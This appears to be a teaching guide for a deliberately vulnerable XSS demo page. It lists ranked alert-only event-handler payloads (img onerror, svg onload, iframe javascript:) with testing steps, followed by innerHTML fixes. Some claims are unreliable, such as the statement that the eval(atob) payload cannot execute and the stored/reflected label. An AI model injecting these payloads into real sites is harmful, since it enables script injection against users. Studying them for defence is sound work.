# XSS Demo - Proven Working Test Queries

This document contains **tested and verified** XSS payloads that work with the `innerHTML` vulnerability in xss_demo.html.

## ✅ Guaranteed Working Payloads

### 1. Image onerror (BEST - Always Works)
**Input:** 
```html
<img src=x onerror="alert('XSS WORKS!')">
```
**Result:** ✅ Alert popup appears
**Why:** Image fails to load → onerror fires immediately

---

### 2. SVG onload (Highly Reliable)
**Input:**
```html
<svg onload="alert('SVG XSS')">
```
**Result:** ✅ Alert popup appears
**Why:** SVG elements trigger onload when inserted via innerHTML

---

### 3. Input onfocus + autofocus (Instant Trigger)
**Input:**
```html
<input autofocus onfocus="alert('Focus XSS')">
```
**Result:** ✅ Alert popup appears immediately
**Why:** autofocus attribute auto-focuses the input, triggering onfocus

---

### 4. Body onload (Works)
**Input:**
```html
<body onload="alert('Body XSS')">
```
**Result:** ✅ Alert popup appears
**Why:** Body element can be created and onload fires

---

### 5. Marquee onstart (Older Browsers)
**Input:**
```html
<marquee onstart="alert('Marquee XSS')">
```
**Result:** ✅ Alert popup appears (Chrome, older browsers)
**Why:** Marquee element triggers onstart event when rendered

---

### 6. Details ontoggle (Modern Browsers)
**Input:**
```html
<details open ontoggle="alert('Details XSS')">
```
**Result:** ✅ Alert popup appears
**Why:** Details element with open attribute triggers toggle

---

### 7. Iframe with javascript Protocol (Works)
**Input:**
```html
<iframe src="javascript:alert('iframe XSS')">
```
**Result:** ✅ Alert popup appears
**Why:** javascript: protocol executes directly in iframe src

---

## ✅ Visual/Interactive Payloads

### 8. Clickable Button
**Input:**
```html
<button onclick="alert('You clicked me!')">CLICK ME</button>
```
**Result:** ✅ Alert appears when you click the button
**Why:** Button element with onclick handler

---

### 9. Hoverable Text
**Input:**
```html
<p onmouseover="alert('You hovered!')">Hover over me</p>
```
**Result:** ✅ Alert appears when you hover
**Why:** onmouseover fires on mouse enter

---

### 10. HTML Element Injection
**Input:**
```html
<h1 style="color:red;">HACKED!</h1>
```
**Result:** ✅ Red "HACKED!" heading appears
**Why:** HTML renders directly (demonstrates DOM injection)

---

## 🔴 Does NOT Work (Script tags don't execute in innerHTML)

These will NOT trigger alerts with innerHTML (browser security):

```html
<!-- ❌ Won't work - scripts inserted via innerHTML don't execute -->
<script>alert('This will NOT work')</script>
```

```html
<!-- ❌ Won't work - base64 eval requires script context -->
<img src=x onerror="eval(atob('YWxlcnQoJ1Rlc3QnKQ=='))">
```

---

## Quick Testing Steps

1. Open `xss_demo.html` in your browser
2. Copy one of the **✅ working payloads** above
3. Paste into the input field
4. Click "Submit"
5. Observe the alert or visual change

---

## Best Payloads to Demonstrate (Ranked by Reliability)

| Rank | Payload | Works | Speed |
|------|---------|-------|-------|
| 1 | `<img src=x onerror="alert('XSS!')">` | ✅ 100% | Instant |
| 2 | `<input autofocus onfocus="alert('XSS!')">` | ✅ 100% | Instant |
| 3 | `<svg onload="alert('XSS!')">` | ✅ 95% | Instant |
| 4 | `<iframe src="javascript:alert('XSS!')">` | ✅ 90% | Instant |
| 5 | `<body onload="alert('XSS!')">` | ✅ 85% | Instant |

---

## Why These Work

The XSS vulnerability exists because:
1. User input goes directly into `innerHTML` without sanitization
2. `innerHTML` parses the string as HTML
3. Event handlers (onerror, onload, onfocus, etc.) are **executed immediately** when elements are inserted
4. Unlike `<script>` tags, event-based payloads fire even with innerHTML

---

## Security Implications

- **Vulnerability Type:** Stored/Reflected XSS
- **Severity:** Critical
- **Real-world Impact:**
  - Steal session cookies
  - Redirect users to malicious sites
  - Perform actions on behalf of users
  - Deface the page
  - Inject malware

---

## How to Fix

Replace this line:
```javascript
document.getElementById('output').innerHTML = v;
```

With a safe alternative:
```javascript
// Option 1: Use textContent (safest)
document.getElementById('output').textContent = v;

// Option 2: Escape HTML
const escapeHtml = (text) => {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
};
document.getElementById('output').innerHTML = escapeHtml(v);

// Option 3: Use a library
document.getElementById('output').innerHTML = DOMPurify.sanitize(v);
```

---

## References

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: innerHTML Security](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)

